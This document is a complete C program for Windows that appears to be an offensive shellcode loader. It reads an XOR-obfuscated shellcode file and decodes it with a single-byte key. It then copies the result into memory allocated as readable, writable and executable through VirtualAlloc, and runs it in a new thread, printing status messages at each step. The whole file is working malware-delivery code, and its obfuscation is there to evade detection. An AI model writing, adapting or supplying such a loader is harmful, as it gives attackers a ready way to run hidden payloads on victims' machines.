#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


void deobfuscate_shellcode(unsigned char *code, size_t length, unsigned char obf_key){


    for(size_t i = 0; i < length; i++){

        code[i] = code[i] ^ obf_key;

    }

}



int main(int argc, char *argv[]) {

    if (argc < 3){


        printf("Usage: %s <obfuscated .bin shellcode file> <Key to deobfuscate>\n", argv[0]);
        return 1;

    }


    FILE * file = fopen(argv[1], "rb");


    if (file == NULL) {

        perror("[-] Error opening file\n");
        return 1;


    }



    printf("[+] Opened File Successfully\n");

   
    fseek(file, 0, SEEK_END);
    size_t len = ftell(file);
    fseek(file, 0, SEEK_SET);



    printf("[+] Reading Obfuscated shellcode\n");

    unsigned char obf_key = (unsigned char)strtoul(argv[2], NULL, 0);

    unsigned char * obfuscated_code = ((unsigned char *)malloc(len));





    if (obfuscated_code == NULL){

        perror("[-] Memory Allocation Failed\n");

        fclose(file);
        return 1;
        

    }




    fread(obfuscated_code, 1, len, file);
    fclose(file);



    printf("[+] Copying shellcode to Memory\n");




deobfuscate_shellcode(obfuscated_code, len, obf_key);



    printf("[+] Deobfuscated Shellcode Successfully\n");



    unsigned char * deobf_shell = ((unsigned char *)malloc(len));
    memcpy(deobf_shell, obfuscated_code, len);


    void *exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


        if (exec == NULL){

            perror("[-] Error Allocating Execution Memory\n");

            free(obfuscated_code);
            free(deobf_shell);

            return 1;

        }




    printf("[+] Successful Allocating Execution Memory\n");
    
    memcpy(exec, deobf_shell, len);



    printf("[+] Copying Deobfuscated Shellcode to Memory\n");

    Sleep(50);

    printf("[+] Executing Shellcode\n");



    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    //((void(*)())exec)();


    printf("[+] Executed Shellcode Successfully\n");


    WaitForSingleObject(thread, INFINITE);


    free(obfuscated_code);
    free(deobf_shell);

    VirtualFree(exec, 0 , MEM_RELEASE);



    CloseHandle(thread);


    return 0;

}